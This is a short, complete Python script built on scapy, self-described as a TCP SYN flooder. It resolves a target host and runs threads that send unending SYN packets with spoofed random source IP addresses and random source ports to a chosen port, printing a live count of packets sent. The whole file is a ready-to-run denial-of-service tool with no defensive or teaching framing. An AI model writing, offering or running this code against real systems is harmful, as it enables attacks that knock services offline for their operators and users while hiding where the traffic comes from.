from scapy.all import *
import argparse
import socket
import random
import time

SENT_PACKETS = 0

def random_ip():
    return f"{random.randrange(100, 255)}.{random.randrange(100, 255)}.{random.randrange(100, 255)}.{random.randrange(100, 255)}"

def attack_handler(host_ip: str, port: int):
    global SENT_PACKETS

    while True:
        ip_packet = IP()
        ip_packet.src = random_ip()
        ip_packet.dst = host_ip

        tcp_packet = TCP()
        tcp_packet.sport = random.randrange(1, 65535)
        tcp_packet.dport = port
        tcp_packet.flags = "S"

        send(ip_packet / tcp_packet, verbose=False)

        SENT_PACKETS += 1

def main():
    parser = argparse.ArgumentParser(description="A simple TCP-SYN flooder.")
    parser.add_argument("host", type=str, help="Target IP.")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port.")
    parser.add_argument("-t", "--threads", type=int, default=1, help="Threads to run for the attack.")

    args = parser.parse_args()

    host_ip = socket.gethostbyname(args.host)
    port = args.port

    print(f"Initializing attack on {host_ip} port: {port}...")

    for i in range(args.threads):
        threading.Thread(target=attack_handler, args=[host_ip, port], daemon=True).start()

    while True:
        print(f"Sent packets: {SENT_PACKETS}")
        time.sleep(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()
